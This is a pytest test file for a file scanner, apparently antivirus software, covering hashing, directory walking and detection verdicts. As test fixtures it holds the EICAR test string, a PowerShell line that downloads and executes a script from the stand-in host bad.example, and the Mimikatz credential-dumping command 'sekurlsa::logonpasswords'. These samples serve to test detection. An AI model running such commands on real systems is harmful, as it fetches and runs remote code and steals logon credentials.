"""Tests for the scanner: hashing vectors, walker safety, scan verdicts."""

import builtins
import hashlib
import os

import pytest

import argus.scanner as scanner
from argus.detections import Verdict
from argus.rules import BUILTIN_RULES
from argus.scanner import ScanStats, hash_file, iter_files, scan_path
from argus.signatures import SignatureDB, init_db

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


@pytest.fixture()
def db(tmp_path):
    path = tmp_path / "sigs.sigdb"
    init_db(path)
    with SignatureDB.open(path) as handle:
        yield handle


# ----------------------------------------------------------------------
# Hashing
# ----------------------------------------------------------------------
def test_hash_known_vectors(tmp_path):
    empty = tmp_path / "empty.bin"
    empty.write_bytes(b"")
    digest, size = hash_file(empty)
    assert digest == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    assert size == 0

    abc = tmp_path / "abc.bin"
    abc.write_bytes(b"abc")
    digest, size = hash_file(abc)
    assert digest == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    assert size == 3


def test_hash_streamed_matches_oneshot(tmp_path):
    data = os.urandom(3 * 1024 * 1024 + 12345)  # > 3 MiB, unaligned tail
    big = tmp_path / "big.bin"
    big.write_bytes(data)
    digest, size = hash_file(big, chunk_size=4096)  # tiny chunks on purpose
    assert digest == hashlib.sha256(data).hexdigest()
    assert size == len(data)


# ----------------------------------------------------------------------
# Walker
# ----------------------------------------------------------------------
def test_walker_nested_dirs(tmp_path):
    (tmp_path / "a" / "b" / "c").mkdir(parents=True)
    files = [
        tmp_path / "top.txt",
        tmp_path / "a" / "mid.txt",
        tmp_path / "a" / "b" / "deep.txt",
        tmp_path / "a" / "b" / "c" / "deepest.txt",
    ]
    for f in files:
        f.write_text("x")
    stats = ScanStats()
    found = set(iter_files(tmp_path, stats))
    assert found == set(files)
    assert stats.files_seen == 4


def test_walker_single_file(tmp_path):
    f = tmp_path / "one.txt"
    f.write_text("hello")
    stats = ScanStats()
    assert list(iter_files(f, stats)) == [f]


def test_walker_does_not_follow_dir_symlinks(tmp_path):
    real = tmp_path / "real"
    real.mkdir()
    (real / "inside.txt").write_text("secret")
    (tmp_path / "top.txt").write_text("top")
    try:
        os.symlink(real, tmp_path / "linkdir")
    except OSError:
        pytest.skip("symlinks not available on this platform")

    stats = ScanStats()
    found = list(iter_files(tmp_path, stats))
    # inside.txt appears exactly once — via the real path, never the link.
    assert found.count(real / "inside.txt") == 1
    assert (tmp_path / "top.txt") in found
    assert stats.dirs_skipped >= 1


def test_walker_file_symlink_is_scanned(tmp_path):
    target = tmp_path / "target.txt"
    target.write_text("content")
    try:
        os.symlink(target, tmp_path / "link.txt")
    except OSError:
        pytest.skip("symlinks not available on this platform")
    stats = ScanStats()
    found = list(iter_files(tmp_path, stats))
    assert (tmp_path / "link.txt") in found


def test_walker_unreadable_dir_counted(tmp_path, monkeypatch):
    blocked = tmp_path / "blocked"
    blocked.mkdir()
    (blocked / "hidden.txt").write_text("x")
    (tmp_path / "open.txt").write_text("y")

    real_scandir = os.scandir

    def fake_scandir(path):
        if str(path) == str(blocked):
            raise PermissionError("denied for test")
        return real_scandir(path)

    monkeypatch.setattr(os, "scandir", fake_scandir)
    stats = ScanStats()
    found = list(iter_files(tmp_path, stats))
    assert (tmp_path / "open.txt") in found
    assert (blocked / "hidden.txt") not in found
    assert stats.dirs_skipped == 1


# ----------------------------------------------------------------------
# Scanning
# ----------------------------------------------------------------------
def test_scan_clean_tree(tmp_path, db):
    tree = tmp_path / "tree"
    tree.mkdir()
    (tree / "notes.txt").write_text("meeting notes, nothing to see here")
    report = scan_path(tree, db, BUILTIN_RULES)
    assert report.verdict is Verdict.CLEAN
    assert report.detections == []
    assert report.stats.files_scanned == 1


def test_scan_eicar_is_malicious(tmp_path, db):
    (tmp_path / "eicar.com").write_bytes(EICAR)
    report = scan_path(tmp_path, db, BUILTIN_RULES)
    assert report.verdict is Verdict.MALICIOUS
    assert len(report.detections) == 1
    det = report.detections[0].assessment.detections[0]
    assert det.kind == "signature"
    assert det.name == "EICAR-Test-File"


def test_scan_rule_hit_is_suspicious(tmp_path, db):
    (tmp_path / "dropper.ps1").write_bytes(
        b"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://bad.example/x')\""
    )
    report = scan_path(tmp_path, db, BUILTIN_RULES)
    # The rule hit itself is a Suspicious-grade rule detection…
    det = report.detections[0].assessment.detections[0]
    assert det.kind == "rule"
    assert det.name == "Suspicious_PowerShell_Download"
    # …and since v1.0.4 the decoded-text cradle signals score the
    # full download-and-execute pattern as what it is: Malicious.
    assert report.verdict is Verdict.MALICIOUS
    signal_names = {s.name for s in report.detections[0].assessment.signals}
    assert "powershell_download_cradle" in signal_names


def test_scan_critical_rule_hit_is_malicious(tmp_path, db):
    (tmp_path / "tool.exe").write_bytes(b"junk sekurlsa::logonpasswords junk")
    report = scan_path(tmp_path, db, BUILTIN_RULES)
    assert report.verdict is Verdict.MALICIOUS


def test_scan_permission_error_counted_not_raised(tmp_path, db, monkeypatch):
    tree = tmp_path / "tree"
    tree.mkdir()
    locked = tree / "locked.txt"
    locked.write_text("you cannot read this")
    (tree / "fine.txt").write_text("readable")

    real_open = builtins.open

    def fake_open(file, *a, **kw):
        if str(file) == str(locked):
            raise PermissionError("denied for test")
        return real_open(file, *a, **kw)

    monkeypatch.setattr(scanner, "open", fake_open, raising=False)
    report = scan_path(tree, db, BUILTIN_RULES)
    assert report.stats.files_skipped == 1
    assert report.stats.files_scanned == 1
    errors = [f for f in report.files if not f.result.ok]
    assert len(errors) == 1
    assert errors[0].path == locked
    assert errors[0].result.error


def test_oversize_file_skips_rules_but_not_hash(tmp_path, db, monkeypatch):
    monkeypatch.setattr(scanner, "MAX_RULE_SCAN_SIZE", 8)
    # Hunt P0-5: oversize SCRIPTS stream pattern rules at any size
    # now (the PE treatment), so this pin uses bulk data — the
    # oversize skip survives for non-program, non-script content.
    # (Script-oversize rule streaming is pinned in
    # tests/test_hunt_b_detection.py.)
    payload = tmp_path / "big.bin"
    payload.write_bytes(b"DownloadString " + b"A" * 100)
    report = scan_path(tmp_path, db, BUILTIN_RULES)
    # Pick the payload by path, never by position: the db fixture's
    # own files (sigs.sigdb + its key file) live in this same
    # directory, and directory enumeration order is filesystem-
    # dependent — on the Linux CI filesystem they enumerate ahead
    # of big.bin, which made files[0] the signature DB and this
    # test compare the DB's hash instead of the payload's (v1.2.0
    # build). The assertions below are about big.bin's result.
    scanned = next(f for f in report.files if f.result.path == payload)
    assert scanned.result.ok
    assert scanned.result.sha256 == hashlib.sha256(payload.read_bytes()).hexdigest()
    assert scanned.rules_skipped_reason is not None
    assert scanned.assessment.detections == []  # rules never ran
